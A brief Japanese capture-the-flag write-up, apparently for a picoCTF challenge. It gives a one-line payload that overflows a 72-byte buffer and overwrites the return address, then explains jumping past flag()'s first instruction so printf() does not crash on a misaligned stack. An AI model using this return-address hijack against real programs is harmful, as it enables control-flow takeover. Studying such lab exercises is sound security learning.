```
echo -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x07@\x00\x00\x00\x00\x00' | ./vuln
```

バッファオーバーフローがあるため、長い文字列を入力すればRIPを奪える。
flag()関数が用意されているので、gdbでp flagでアドレスを調べて 'a' * 72　+ p64(flag()のアドレス)でいける、と思いきや、、。
ローカルでは通るがpicoの環境では通らない。
どうやらprintf()内の命令で、rspの値が壊れているとセグフォで落ちる部分があるらしい。
こういう時はflag()の2命令目とか3命令目くらいに飛ばすというテクがあったなと思って2命令目に飛ばしたらフラグが出た。